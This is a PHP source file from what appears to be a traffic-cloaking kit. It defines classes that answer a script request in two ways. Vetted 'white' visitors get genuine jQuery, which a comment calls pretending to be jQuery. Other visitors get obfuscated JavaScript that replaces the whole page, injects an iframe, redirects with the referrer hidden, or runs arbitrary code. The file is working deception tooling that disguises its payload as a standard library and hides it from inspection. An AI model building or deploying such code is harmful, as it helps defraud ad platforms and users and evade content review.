<?php
require_once __DIR__ . '/redirect.php';
class CloakerAction
{
    public string $click_type;
    public string $action;
    public string $value;
    public int $redirect_type;
    
    public function __construct(string $click_type, string $action, string $value, int $redirect_type=0)
    {
        $this->click_type = $click_type;
        $this->action = $action;
        $this->value = $value;
        $this->redirect_type = $redirect_type;
    }

    public function perform(){
        switch ($this->action){
            case 'html':
                echo $this->value;
                break;
            case 'redirect':
                redirect($this->value,$this->redirect_type,true);
                break;
            case 'error':
                http_response_code($this->value);
                break;
            default:
                die($this->value);
        }
    }
}

class JsAction extends CloakerAction
{
    public static function FromCloakerAction(CloakerAction $action):JsAction
    {
        return new JsAction($action->click_type, $action->action, $action->value, $action->redirect_type);
    }

    private function content_replace():string
    {
        $b64 = base64_encode($this->value);
        $js_code = <<<EOT
            var html = decodeURIComponent(escape(atob('$b64')));
            var tempDiv = document.createElement('div');
            tempDiv.innerHTML = html;
            
            var scripts = tempDiv.querySelectorAll('script');
            var scriptContents = [];
            var scriptSrcs = [];
            
            scripts.forEach(function(script) {
                if (script.src) {
                    scriptSrcs.push(script.src);
                } else {
                    scriptContents.push(script.innerHTML);
                }
                script.remove(); 
            });
            
            document.documentElement.innerHTML = tempDiv.innerHTML;
            
            scriptSrcs.forEach(function(src) {
                var script = document.createElement('script');
                script.src = src;
                document.head.appendChild(script);
            });
            
            scriptContents.forEach(function(content) {
                var script = document.createElement('script');
                script.innerHTML = content;
                document.head.appendChild(script);
            });
        EOT;
        return $js_code;
    }
    
    private function show_iframe():string
    {
        $js_code = file_get_contents(__DIR__.'/js/iframe.js');
        $b64 = base64_encode($this->value);
        $js_code .= "\nshowIframe(decodeURIComponent(escape(atob('$b64'))));";
        return $js_code;
    }

    private function meta_redirect(): string
    {
        $js_code = <<<EOT
            document.open();
            document.write(`
                <html>
                    <head> 
                    <meta name="referrer" content="never" /> 
                    <meta http-equiv="refresh" content="0; url=$this->value" /> 
                    </head>
                </html>`);
            document.close();
EOT;
        return $js_code;
    }

    public function perform(){
        header('Content-Type: text/javascript');

        //for white clicks and js connect we don't need 
        //to change the existing white or to redirect
        //just stay where we are and pretend we are JQuery, haha
        if ($this->click_type === 'white') {
            $jq = get("https://code.jquery.com/jquery-3.6.1.min.js");
            echo $jq['content'];
            return;
        }
        
        switch ($this->action){
            case 'html_content':
                $js_code = $this->content_replace();
                break;
            case 'html_iframe':
                $js_code = $this->show_iframe();
                break;
            case 'redirect':
                $url = urldecode($this->value);
                $js_code = $this->meta_redirect();
                break;
            case 'js':
                $js_code = $this->value;
                break;
            default:
                http_response_code(404); 
                return;
        }

        if (!DebugMethods::on()) {
            $hunter = new HunterObfuscator($js_code);
            echo $hunter->Obfuscate();
        } else {
            echo $js_code;
        }
    }
}
